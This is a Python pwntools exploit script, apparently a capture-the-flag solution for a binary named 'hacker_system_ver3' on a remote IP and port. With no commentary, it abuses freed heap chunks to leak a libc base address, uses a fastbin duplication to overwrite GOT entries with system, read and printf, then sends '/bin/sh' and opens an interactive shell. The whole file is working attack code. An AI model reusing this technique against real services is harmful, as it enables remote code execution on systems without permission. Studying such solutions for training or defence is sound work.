#coding=utf8
from pwn import *
context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

local = 0

if local:
	cn = process('./hacker_system_ver3')
	bin = ELF('./hacker_system_ver3')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
	cn = remote('111.230.149.72',10014)
	bin = ELF('./hacker_system_ver3')
	libc = ELF('./libc64.so')


def z(a=''):
	gdb.attach(cn,a)
	if a == '':
		raw_input()


def add(name,age,intro):
	cn.sendline('1')
	cn.recv()
	cn.sendline(name)
	cn.recv()
	cn.sendline(str(age))
	cn.recv()
	cn.sendline(str(len(intro)))
	cn.recv()
	cn.sendline(intro)

def dele(name):
	cn.sendline('3')
	cn.recv()
	cn.sendline(name)

add('aaa',123,'asd')
add('veritas501',666,'a'*0x80)
add('bbb',123,'asd')
add('veritas501',123,'a'*0x80)
add('ccc',123,'asd')

dele('veritas501')
cn.sendline('2')
cn.recv()
cn.sendline('veritas501')
cn.recvuntil('id:5')
cn.recvuntil('intro:')
libc_base = u64(cn.recv(6)+'\x00'*2)-(0x3c4b20+88)
success(hex(libc_base))

add('bbb',123,'a'*0x20)
add('bbb',123,'a'*0x20)
add('bbb',123,'a'*0x20)
add('bbb',123,'a'*0x20)
add('bbb',123,'a'*0x20)
add('vvvvvv',666,'a'*0x30)
add('bbb',123,'asd')
add('vvvvvv',666,'a'*0x30)
add('bbb',123,'asd')


dele('vvvvvv')
dele('vvvvvv')
add('vvvvvv',str(0x602032),'a')
add('vvvvvv',123,'a'*0x30)
add('vvvvvv',123,'a')

read = libc_base + libc.symbols['read']
system = libc_base + libc.symbols['system']
printf = libc_base + libc.symbols['printf']
pay = p64(printf)[2:]+p64(read)+p64(system)*10
#z('b*0x0000000000400A5f\nb*0x0000000000400AFB\nc')
add('\x00',66666,pay[:0x30])


cn.sendline('2')
cn.recv()
cn.sendline('/bin/sh')

cn.interactive()

